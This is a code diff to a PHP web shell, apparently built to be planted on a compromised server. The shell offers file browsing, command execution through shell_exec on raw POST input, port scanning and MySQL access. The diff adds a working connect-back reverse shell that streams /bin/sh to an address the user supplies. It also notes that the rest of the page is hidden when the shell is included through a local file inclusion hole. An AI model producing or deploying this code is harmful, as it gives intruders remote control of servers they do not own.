@@ -134,13 +134,14 @@ a.plus {font-weight: bold;color: #aaa;}
 a.linkdir {text-decoration: none;color: #55f;min-height: 32px;}
 a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';
 
-if (in_array(MODE, array('browser', 'portscan', 'mysql')))
+if (in_array(MODE, array('browser', 'portscan', 'reverse-shell', 'mysql')))
 {
 	$id = (IS_WIN ? getenv('username') : get_current_user() .'@'. gethostname());
 
 	echo $html_header . $css . '<h4>php browser - '. $id .'</h4><p>'.
 	(MODE == 'browser' ? 'browser' : '<a href="'. SCRIPT_NAME .'?mode=browser'. build_params('mode') .'" class="menu">browser</a>') .' - '. 
 	(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .'?mode=shell'. build_params('mode') .'\', \'\', \'width=820,height=385,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
+	(MODE == 'reverse-shell' ? 'reverse-shell' : '<a href="'. SCRIPT_NAME .'?mode=reverse-shell'. build_params('mode') .'" class="menu">reverse-shell</a>') .' - ' .
 	(MODE == 'phpinfo' ? 'phpinfo' : '<a href="'. SCRIPT_NAME .'?mode=phpinfo'. build_params('mode') .'" class="menu">phpinfo</a>') .' - ' .
 	(MODE == 'portscan' ? 'portscan' : '<a href="'. SCRIPT_NAME .'?mode=portscan'. build_params(array('mode')) .'" class="menu">portscan</a>') .' - '.
 	(MODE == 'mysql' ? 'mysql' : '<a href="'. SCRIPT_NAME .'?mode=mysql'. build_params(array('mode')) .'" class="menu">mysql</a>'). '</p>';
@@ -198,7 +199,14 @@ if (MODE == 'shell')
 
 		else
 		{
-			$cmd_output = shell_exec($_POST['cmd'] .' 2>&1');
+			/* Somes aliases */
+			switch ($_POST['cmd'])
+			{
+				case 'l': $cmd = 'ls -l'; break ;
+				case 'la': $cmd = 'ls -la'; break ;
+				default: $cmd = $_POST['cmd']; break ;
+			}
+			$cmd_output = shell_exec($cmd .' 2>&1');
 			$cmd_output = strtr($cmd_output, array(chr(255) => ' ', chr(244) => 'ô', chr(224) => 'à', chr(195) => 'é', chr(130) => 'é', chr(233) => 'é', chr(160) => ' '));
 			echo $cmd_output;
 		}
@@ -299,6 +307,105 @@ if (MODE == 'portscan')
 	}
 }
 
+/* PHP connect-back shell */
+if (MODE == 'reverse-shell')
+{
+	// Code ripped from:
+	// php-reverse-shell - A Reverse Shell implementation in PHP
+	// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+	echo "<h5 style=\"font-size:14px;\">Connect-back shell</h5>";
+	echo '<form action="" method="post">
+	Connect back to this IP address: <input type=text name="rshell_addr" value="'. $_SERVER['REMOTE_ADDR'] .'" size="15"> Port <input type="text" name="rshell_port" value="4444" size="4"/>
+	<input type=submit name=submit value="Connect back!"><br>
+	<input type="hidden" name="run_rshell" value="1" /><br>
+	<b>Note: don\'t forget to run netcat on the chosen port at your server.</b><br>
+	</form><div id="rshell_log"></div>';
+	
+	if (isset($_POST['run_rshell']))
+	{
+		$ip = $_POST['rshell_addr'];
+		$port = intval($_POST['rshell_port']);
+		$chunk_size = 1400;
+		$write_a = null;
+		$error_a = null;
+		$shell = 'echo "Connected to '. $_SERVER['HTTP_HOST'] .'"; /bin/sh -i';
+		$daemon = 0;
+
+		if (function_exists('pcntl_fork'))
+		{
+			$pid = pcntl_fork();
+		
+			if ($pid == -1) die('<p><span style="color: red">Error: Can\'t fork</span></p>');
+		
+			if ($pid) exit(0);
+			if (posix_setsid() == -1) die('<p><span style="color: red">Error: Can\'t setsid()</span></p>');
+			$daemon = 1;
+		}
+		else echo '<p><span style="color: maroon">Warning: Failed to daemonise.  This is quite common and not fatal.</span></p>';
+
+		chdir("/");
+		umask(0);
+
+		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+		if (!$sock) die("<p><span style=\"color: red\">Error: $errstr ($errno)</span></p>");
+
+		$descriptorspec = array(
+		   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+		   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+		   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+		);
+
+		$process = proc_open($shell, $descriptorspec, $pipes);
+
+		if (!is_resource($process)) die('<p><span style="color: red">Error: Can\'t spawn shell</span></p>');
+
+		stream_set_blocking($pipes[0], 0);
+		stream_set_blocking($pipes[1], 0);
+		stream_set_blocking($pipes[2], 0);
+		stream_set_blocking($sock, 0);
+
+		echo '<p><span style="color: green">Successfully opened reverse shell to '. $ip .':'. $port .'</span></p>';
+
+		while (1)
+		{
+			if (feof($sock)) {
+				echo '<p><span style="color: red">Error: Shell connection terminated</span></p>';
+				break;
+			}
+
+			if (feof($pipes[1])) {
+				echo '<p><span style="color: red">Error: Shell process terminated</span></p>';
+				break;
+			}
+
+			$read_a = array($sock, $pipes[1], $pipes[2]);
+			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+			if (in_array($sock, $read_a)) {
+				$input = fread($sock, $chunk_size);
+				fwrite($pipes[0], $input);
+			}
+
+			if (in_array($pipes[1], $read_a)) {
+				$input = fread($pipes[1], $chunk_size);
+				fwrite($sock, $input);
+			}
+
+			if (in_array($pipes[2], $read_a)) {
+				$input = fread($pipes[2], $chunk_size);
+				fwrite($sock, $input);
+			}
+		}
+
+		fclose($sock);
+		fclose($pipes[0]);
+		fclose($pipes[1]);
+		fclose($pipes[2]);
+		proc_close($process);
+	}
+}
+
 /* Display phpinfo */
 if (MODE == 'phpinfo')
 {
@@ -393,7 +500,7 @@ if (MODE == 'mysql')
 {
 	echo "<h5 style=\"font-size:14px;\">MySQL connector</h5>";
 	echo '<form action="" method="post">
-	Database IP / Hostname <input type=text name="db_host" value="'. (isset($_POST['db_host']) ? $_POST['db_host'] : '127.0.0.1') .'" size="12">
+	Database IP / Hostname <input type=text name="db_host" value="'. (isset($_POST['db_host']) ? $_POST['db_host'] : '127.0.0.1') .'" size="15">
 	Database User <input type="text" name="db_user" value="'. (isset($_POST['db_user']) ? $_POST['db_user'] : 'root') .'" size="10">
 	Database Pass <input type="password" name="db_pass" value="'. (isset($_POST['db_pass']) ? $_POST['db_pass'] : '') .'" size="10">
 	<input type="submit" name="db_list" value="List databases">';
@@ -467,6 +574,7 @@ if (MODE == 'mysql')
 	echo '</form>';
 }
 
+/* Hide remainder of page */
 if (IS_LFI_BASED)
 	echo '<div style="display: none;">';
 
